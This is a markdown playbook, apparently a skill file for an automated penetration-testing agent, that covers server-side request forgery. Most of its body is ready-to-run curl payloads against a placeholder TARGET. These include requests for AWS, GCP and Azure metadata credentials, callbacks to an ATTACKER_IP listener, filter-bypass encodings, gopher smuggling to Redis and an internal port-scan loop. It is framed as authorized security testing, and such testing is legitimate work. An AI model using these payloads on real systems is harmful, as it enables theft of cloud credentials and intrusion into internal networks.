---
name: attack-ssrf
description: "Server-Side Request Forgery — internal network access, cloud metadata theft, filter bypass techniques"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - ssrf
  - web
  - injection
  - cloud
  - attack
tech_stack:
  - web
  - aws
  - gcp
  - azure
cwe_ids:
  - CWE-918
chains_with:
  - attack-xxe
  - attack-ssti
prerequisites: []
severity_boost:
  attack-xxe: "SSRF via XXE parser = file read + internal network scanning"
  attack-ssti: "SSRF from SSTI = full RCE chain"
---

# Server-Side Request Forgery (SSRF)

## Objective

Force the server to make requests to internal resources, cloud metadata endpoints, or attacker-controlled servers.

## Testing Methodology

### Phase 1: Identify URL Input Points

Look for parameters that accept URLs:
- Webhook URLs, callback URLs
- File import/export (URL-based)
- PDF/image generation from URL
- URL preview/unfurling
- Proxy/redirect endpoints

### Phase 2: Basic SSRF Payloads

```bash
# Start callback listener
attack_script ssrf_listener -p 8888 -o ssrf_evidence.json &

# Test URL parameters
curl "https://TARGET/api/fetch?url=http://ATTACKER_IP:8888/ssrf-test"
curl "https://TARGET/api/preview?link=http://127.0.0.1:80"
```

### Phase 3: Cloud Metadata

```bash
# AWS IMDSv1
curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# GCP
curl "https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/"

# Azure
curl "https://TARGET/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### Phase 4: Filter Bypass

```bash
# Decimal IP (127.0.0.1 = 2130706433)
curl "https://TARGET/fetch?url=http://2130706433/"

# Hex IP
curl "https://TARGET/fetch?url=http://0x7f000001/"

# IPv6
curl "https://TARGET/fetch?url=http://[::1]/"

# URL encoding
curl "https://TARGET/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/"

# DNS rebinding (use your own DNS server)
curl "https://TARGET/fetch?url=http://rebind.127.0.0.1.nip.io/"

# Redirect bypass
curl "https://TARGET/fetch?url=http://ATTACKER/redirect?to=http://169.254.169.254/"

# Protocol smuggling
curl "https://TARGET/fetch?url=gopher://127.0.0.1:6379/_INFO"
```

### Phase 5: Internal Port Scanning

```bash
# Scan common internal ports
for port in 80 443 8080 8443 3306 5432 6379 27017 9200 11211; do
  curl -s -o /dev/null -w "%{http_code}" "https://TARGET/fetch?url=http://127.0.0.1:$port/" &
done
wait
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Cloud metadata access (credentials) | Critical (P1) |
| Internal network access | High (P2) |
| Out-of-band HTTP callback | Medium (P3) |
| Blind SSRF (timing-based) | Medium (P3) |
| File read via file:// protocol | Critical (P1) |
| gopher:// protocol access | High (P2) |

## Evidence Requirements

- URL parameter with SSRF payload
- Response containing internal data or metadata
- For blind SSRF: OOB callback evidence (use ssrf_listener)
- Network topology information gathered

## Tools

- `attack_script ssrf_listener` — OOB callback listener
- `curl` — manual SSRF testing

## References

- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf)
- [OWASP: SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
